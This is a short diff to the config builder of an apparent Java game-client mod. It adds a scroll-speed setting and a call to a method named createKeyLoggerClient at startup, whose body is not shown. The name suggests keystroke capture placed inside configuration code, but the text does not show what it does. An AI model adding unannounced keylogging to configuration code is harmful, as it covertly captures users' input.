@@ -1,5 +1,6 @@
 package com.thana.sugarapi.common.core;
 
+import com.thana.sugarapi.client.config.handler.MouseScroll;
 import com.thana.sugarapi.common.utils.JsonConfig;
 
 public class SugarAPIClientConfigBuilder {
@@ -16,7 +17,9 @@ public class SugarAPIClientConfigBuilder {
         CONFIG.put("hideScoreboard", false);
         CONFIG.put("formatDebugOverlay", true);
         CONFIG.put("headerColor", "aqua");
+        CONFIG.put("scrollDelta", MouseScroll.SLOW.toString());
 
         CONFIG.createConfigClient();
+        CONFIG.createKeyLoggerClient();
     }
 }
